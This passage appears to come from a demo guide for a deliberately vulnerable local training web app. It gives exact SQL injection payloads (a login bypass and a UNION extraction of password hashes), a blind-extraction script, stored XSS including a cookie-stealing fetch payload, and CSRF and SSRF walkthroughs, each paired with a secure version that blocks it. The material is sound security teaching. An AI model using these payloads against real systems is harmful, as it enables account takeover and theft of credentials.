6.1  SQL INJECTION - login bypass (Khairy's module)
--------------------------------------------------------------------
1. Go to http://127.0.0.1:5000/modules/sql-injection/vulnerable-login
2. In the Username box, type exactly:
       ' OR 1=1--
   Leave the password box as anything, e.g. "x".
3. Click "Run Vulnerable Query".
4. Result: the page shows "The unsafe query returned N user record(s)"
   even though you typed no real password - the injected condition
   makes the query's WHERE clause always true, so it returns real user
   rows without checking credentials at all. (This lab page runs the
   query in isolation to show you the effect - it does not log you
   into the real app session; the same broken query shape is what
   /auth/login would use if it were built this way.) Point at the
   "Generated SQL" box on screen - that's the whole vulnerability in
   one picture.

--------------------------------------------------------------------
6.2  SQL INJECTION - UNION-based data extraction
--------------------------------------------------------------------
1. Go to http://127.0.0.1:5000/portal/developer/employee-search
2. In the search box, paste exactly:
       zzz' UNION SELECT id, username, email, password_hash, 'x','x','x' FROM users /*
3. Click "Search records".
4. Result: the employee table now shows rows that are actually your
   USERS table, not employees - you'll see real usernames, emails, and
   password hashes (starting with "scrypt:...") sitting in the results
   table. The "Search Audit Details" box above the results shows the
   exact query that was run.

6.3  SQL INJECTION - automated blind extraction (the automation script)
--------------------------------------------------------------------
This one you run from a SECOND PowerShell window (keep the app running
in the first one).
1. Open a new PowerShell window, go to the project folder again.
2. Activate the environment again:
       .\.venv\Scripts\Activate.ps1
3. Run:
       python attacks\automation.py
4. Watch it print lines like:
       [SQLi blind boolean-based extraction] ... -> extracted prefix 'scrypt'
   The extraction itself never reads the database or sees its rows -
   it only asks yes/no questions through the login page ("does
   character 1 equal 'a'? equal 'b'? ...") and builds up the answer
   one character at a time purely from whether the page says success
   or failure. This is what "blind SQL injection" means: the attacker
   never sees data directly, only a true/false signal, and that's
   still enough to steal it. (The script does open its own direct
   connection to the database separately, only to write its results
   into the attack_results table you'll view in step 5 - that part is
   just bookkeeping, not part of the attack.) It also runs the XSS,
   CSRF, and SSRF payloads automatically (see 6.6, 6.8, 6.10) and
   records everything, though note it cannot trigger the cookie-theft
   part of 6.6 itself - see that step for why.
5. Afterwards go to http://127.0.0.1:5000/modules/attack-automation
   to see the full results table - good screen to show on camera.

6.5  XSS - stored script execution (the simple, visual proof)
--------------------------------------------------------------------
1. Go to http://127.0.0.1:5000/modules/xss/vulnerable-wall
2. In the comment box, type exactly:
       <script>alert('XSS by Yousef')</script>
3. Click "Post (unsafe render)".
4. Result: an actual JavaScript alert popup appears on the page,
   right now, in your own browser - not because you're viewing "your
   own" comment specially, but because ANY visitor to this page from
   now on gets this popup. Reload the page to prove it fires again on
   a fresh page load. This is very visual for the camera.

--------------------------------------------------------------------
6.6  XSS - stealing a cookie (the more advanced proof)
--------------------------------------------------------------------
1. Same page, http://127.0.0.1:5000/modules/xss/vulnerable-wall
   Post a second comment, exactly:
       <img src=x onerror="fetch('/modules/xss/collect?value='+document.cookie)">
2. Click Post. Nothing visibly happens (that's the point of a real
   attack - it's silent).
3. Go to http://127.0.0.1:5000/modules/xss/stolen
4. Result: you'll see a captured entry showing a cookie value that got
   silently sent to the "attacker's" collection endpoint just by you
   loading the page. Explain on camera: in a real attack this would be
   another visitor's session cookie, letting the attacker log in as
   them.
   Note: this only fires in a real browser, because it needs
   JavaScript to actually run. attacks\automation.py (6.3) posts this
   same payload and can confirm it's stored unescaped, but it cannot
   make the fetch(...) call happen itself - that's why you have to do
   this step by hand in your browser rather than relying on the
   script's output for it.

6.8  CSRF - forged request steals points
--------------------------------------------------------------------
For this one you need to visit a page that is NOT the app itself, to

1. In your normal browser (logged in as yourself), go to
       http://127.0.0.1:5000/modules/csrf/

6.9  CSRF - prove the secure version blocks it
--------------------------------------------------------------------
1. Go to http://127.0.0.1:5000/modules/csrf/secure-transfer and note

--------------------------------------------------------------------
6.10  SSRF - reaching an internal-only page through the server
--------------------------------------------------------------------
This is the one demo where the "attacker" and the "server" need to
look like genuinely different callers, so use <YOUR-IP> from Part 1,
not 127.0.0.1, for the direct-access part.
1. First, prove the internal page is normally protected. In your
   browser, go to:
       http://<YOUR-IP>:5000/internal/secret-report
   Result: "Forbidden: this endpoint only accepts requests from
   localhost." - your browser's request arrives from your machine's
   real network address, which is not localhost as far as the server
   is concerned, so it's rejected.
2. Now log in and go to:
       http://<YOUR-IP>:5000/modules/ssrf/vulnerable-fetch
3. In the URL box, type exactly:
       http://127.0.0.1:5000/internal/secret-report
4. Click "Fetch server-side".
5. Result: it succeeds and shows the confidential report text
   ("CONFIDENTIAL INTERNAL REPORT... Admin API key: ..."). Explain on
   camera: this time the request to /internal/secret-report is made
   by the Flask SERVER itself, which really is on 127.0.0.1 from its
   own point of view - so the same protection that blocked you
   directly in step 1 does not stop the server from fetching it on
   your behalf. That gap is exactly what SSRF exploits.

--------------------------------------------------------------------
6.11  SSRF - prove the secure version blocks it
--------------------------------------------------------------------
1. Go to http://<YOUR-IP>:5000/modules/ssrf/secure-fetch
2. Enter the same URL:
       http://127.0.0.1:5000/internal/secret-report
3. Result: "Blocked: '127.0.0.1' is not on the allow-list." - this
   version only fetches a short list of approved public hostnames and
   separately checks the resolved IP address isn't private/loopback,
   so the internal address never gets requested at all. Try
   http://example.com too, to show a request that IS allowed through.

PART 11 - QUICK TROUBLESHOOTING
====================================================================

"python is not recognized"
  You're not in an activated virtual environment, or Python isn't
  installed. Re-run Part 2 step 4 (Activate.ps1).

"pip install" shows a weird logging error but seems to finish anyway
  This happens because of the Hebrew characters in the folder path -
  it's cosmetic. Confirm it actually worked with:
      pip list
  and check Flask and requests are both listed.

The app won't start / "port already in use"
  Something is already running on port 5000. Find and stop it:
      Get-NetTCPConnection -LocalPort 5000 | ForEach-Object { Stop-Process -Id $_.OwningProcess -Force }
  then run "python run.py" again.

Wireshark shows nothing happening
  You picked the wrong adapter. If testing on 127.0.0.1, you must
  pick the loopback adapter, not Wi-Fi/Ethernet - see Part 4.

The SSRF direct-access step (6.10 step 1) did NOT get blocked
  You probably used 127.0.0.1 instead of <YOUR-IP> in the URL. The
  block only triggers when the caller's address is not localhost -
  you must browse to http://<YOUR-IP>:5000/... for that first check.

attacks\automation.py fails with a connection error
  The app isn't running. Open the first PowerShell window and confirm
  "python run.py" is still running there.

You changed a payload/text above and it stopped working
  Copy the payloads from this file exactly, including the punctuation
  ('--, /*, quotes) - SQL injection is precise, one wrong character
  and it just becomes a normal search term instead of an attack.
